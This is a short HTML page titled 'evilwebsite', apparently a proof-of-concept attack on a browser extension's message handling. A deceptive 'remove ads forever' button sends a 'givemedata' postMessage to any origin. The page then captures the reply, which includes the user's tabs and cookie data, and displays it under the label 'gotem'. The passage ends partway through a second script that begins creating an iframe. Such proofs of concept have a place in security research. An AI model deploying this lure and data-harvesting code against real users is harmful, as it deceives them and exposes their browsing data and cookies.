<!DOCTYPE html>
<html>

<body>
  <h1>evilwebsite</h1>

  <button onclick="requestStolenData()">Click to activate remove ads forever</button>


  <div class="status" id="status"></div>
  <pre id="result">..</pre>

  <script>
    const statusEl = document.getElementById('status');
    const resultEl = document.getElementById('result');

    let responseTimeout = null;

    function log(text, isError = false) {
      resultEl.textContent = text;
      statusEl.className = isError ? 'status error' : 'status success';
    }

    function requestStolenData() {

      window.postMessage({type: "givemedata"}, "*");


      clearTimeout(responseTimeout);
      responseTimeout = setTimeout(() => {
        log("didnt work", true);
      }, 1000);
    }

    window.addEventListener("message", (event) => {
      if (event.data.type === "givemedata") {
        clearTimeout(responseTimeout);

        const data = event.data.data || {};

        if (data.error) {
          log("Extension Error: " + data.error, true);
        } else if (data.tabs || data.cookiesCount !== undefined) {
          statusEl.textContent = "gotem";
          resultEl.textContent = JSON.stringify(data, null, 2);
        }
      }
    });

  </script>
  <script>
    {

            const iframe = document.createElement('iframe');
